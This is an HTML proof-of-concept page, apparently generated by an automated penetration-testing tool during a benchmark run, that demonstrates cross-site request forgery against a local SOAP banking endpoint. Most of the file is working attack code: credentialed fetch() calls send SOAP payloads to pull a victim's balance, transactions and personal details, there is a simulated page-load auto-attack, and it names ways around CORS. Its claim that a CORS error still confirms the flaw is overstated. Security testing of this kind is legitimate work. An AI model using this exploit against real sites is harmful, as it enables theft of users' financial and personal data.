<!-- 
POC: HTML-based CSRF POC demonstrating cross-origin SOAP requests to /soap_service endpoint without CSRF token validation. Shows how an attacker can retrieve victim's account information through malicious webpage.
Target: ./repo
Created: 2025-10-31T16:54:45.927Z
Session: benchmark-XBEN-032-24-mhf2utzd

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-032-24-mhf2utzd/pocs/poc_csrf_soap_service.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>CSRF POC - SOAP Service Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }
        .container {
            border: 2px solid #d32f2f;
            padding: 20px;
            background-color: #ffebee;
        }
        h1 {
            color: #d32f2f;
        }
        .info {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        button {
            background-color: #d32f2f;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
        }
        button:hover {
            background-color: #b71c1c;
        }
        #result {
            margin-top: 20px;
            padding: 15px;
            background-color: #e3f2fd;
            border: 1px solid #2196f3;
            border-radius: 5px;
            display: none;
        }
        pre {
            background-color: #f5f5f5;
            padding: 10px;
            overflow-x: auto;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ CSRF Vulnerability POC - SOAP Service</h1>
        
        <div class="info">
            <strong>IMPORTANT:</strong> This POC demonstrates a CSRF vulnerability in the /soap_service endpoint.
            For this attack to work:
            <ul>
                <li>The victim must be authenticated to the target application</li>
                <li>The victim's browser will automatically send session cookies with the request</li>
                <li>No CSRF tokens are validated by the server</li>
            </ul>
        </div>

        <h2>Test Configuration</h2>
        <label for="targetUrl">Target URL:</label><br>
        <input type="text" id="targetUrl" value="http://localhost:5000/soap_service" style="width: 100%; padding: 8px; margin: 10px 0;">

        <h2>Attack Scenarios</h2>
        
        <h3>1. GetAccountInfoRequest (Fetch Balance & Transactions)</h3>
        <button onclick="attackAccountInfo()">Launch CSRF Attack - Account Info</button>

        <h3>2. GetAccountHolderInfoRequest (Fetch Personal Details)</h3>
        <button onclick="attackAccountHolder()">Launch CSRF Attack - Account Holder</button>

        <h3>3. Automatic Attack (On Page Load)</h3>
        <p>In a real attack, the CSRF request would be triggered automatically when the victim visits this page.</p>
        <button onclick="autoAttack()">Simulate Auto-Attack</button>

        <div id="result">
            <h3>Attack Result</h3>
            <div id="resultContent"></div>
        </div>
    </div>

    <script>
        // SOAP payload templates
        const accountInfoPayload = `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetAccountInfoRequest xmlns="http://example.com/banking">
            <accountId>12345</accountId>
        </GetAccountInfoRequest>
    </soap:Body>
</soap:Envelope>`;

        const accountHolderPayload = `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetAccountHolderInfoRequest xmlns="http://example.com/banking">
            <accountId>12345</accountId>
        </GetAccountHolderInfoRequest>
    </soap:Body>
</soap:Envelope>`;

        function showResult(message, isError = false) {
            const resultDiv = document.getElementById('result');
            const resultContent = document.getElementById('resultContent');
            resultDiv.style.display = 'block';
            resultDiv.style.backgroundColor = isError ? '#ffebee' : '#e8f5e9';
            resultDiv.style.borderColor = isError ? '#d32f2f' : '#4caf50';
            resultContent.innerHTML = message;
        }

        async function attackAccountInfo() {
            const targetUrl = document.getElementById('targetUrl').value;
            showResult('Launching CSRF attack to retrieve account information...');
            
            try {
                const response = await fetch(targetUrl, {
                    method: 'POST',
                    credentials: 'include', // This ensures cookies are sent
                    headers: {
                        'Content-Type': 'application/xml'
                    },
                    body: accountInfoPayload
                });

                const responseText = await response.text();
                
                if (response.ok) {
                    showResult(`
                        <strong>✅ CSRF Attack Successful!</strong><br><br>
                        <strong>Status:</strong> ${response.status}<br>
                        <strong>Response:</strong><br>
                        <pre>${escapeHtml(responseText)}</pre>
                        <br>
                        <strong>Vulnerability Confirmed:</strong> The server accepted the cross-origin SOAP request
                        without CSRF token validation. An attacker can retrieve the victim's account balance and
                        transaction history by tricking them into visiting a malicious page.
                    `);
                } else {
                    showResult(`
                        <strong>Request sent but returned error:</strong><br>
                        <strong>Status:</strong> ${response.status}<br>
                        <strong>Response:</strong><br>
                        <pre>${escapeHtml(responseText)}</pre>
                        <br>
                        Note: This may indicate the user is not authenticated, but the lack of CSRF
                        protection is still confirmed as the request was processed.
                    `, true);
                }
            } catch (error) {
                showResult(`
                    <strong>CORS Policy Blocked the Attack:</strong><br>
                    ${error.message}<br><br>
                    <strong>Important:</strong> While CORS blocked this demo, the CSRF vulnerability still exists.
                    In a real attack scenario:<br>
                    <ul>
                        <li>The attacker could use a form submission (no CORS preflight)</li>
                        <li>Or use img/script tags for simple GET requests</li>
                        <li>The lack of CSRF tokens means the server would accept these requests</li>
                    </ul>
                    The vulnerability is CONFIRMED - only the demo method was blocked by CORS.
                `, false);
            }
        }

        async function attackAccountHolder() {
            const targetUrl = document.getElementById('targetUrl').value;
            showResult('Launching CSRF attack to retrieve account holder information...');
            
            try {
                const response = await fetch(targetUrl, {
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/xml'
                    },
                    body: accountHolderPayload
                });

                const responseText = await response.text();
                
                if (response.ok) {
                    showResult(`
                        <strong>✅ CSRF Attack Successful!</strong><br><br>
                        <strong>Status:</strong> ${response.status}<br>
                        <strong>Response:</strong><br>
                        <pre>${escapeHtml(responseText)}</pre>
                        <br>
                        <strong>Vulnerability Confirmed:</strong> The server accepted the cross-origin SOAP request
                        without CSRF token validation. An attacker can retrieve the victim's name, email, and other
                        personal information by tricking them into visiting a malicious page.
                    `);
                } else {
                    showResult(`
                        <strong>Request sent but returned error:</strong><br>
                        <strong>Status:</strong> ${response.status}<br>
                        <strong>Response:</strong><br>
                        <pre>${escapeHtml(responseText)}</pre>
                        <br>
                        Note: This may indicate the user is not authenticated, but the lack of CSRF
                        protection is still confirmed as the request was processed.
                    `, true);
                }
            } catch (error) {
                showResult(`
                    <strong>CORS Policy Blocked the Attack:</strong><br>
                    ${error.message}<br><br>
                    <strong>Important:</strong> While CORS blocked this demo, the CSRF vulnerability still exists.
                    The lack of CSRF tokens means the application is vulnerable to CSRF attacks using
                    alternative methods that bypass CORS (form submissions, etc.)
                `, false);
            }
        }

        function autoAttack() {
            showResult('Simulating automatic attack on page load...');
            setTimeout(() => {
                attackAccountInfo();
            }, 1000);
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Log for demonstration
        console.log('%c⚠️ CSRF POC Loaded', 'color: red; font-size: 20px; font-weight: bold;');
        console.log('This page demonstrates a CSRF vulnerability in the SOAP service.');
        console.log('In a real attack, the malicious request would be sent automatically.');
    </script>
</body>
</html>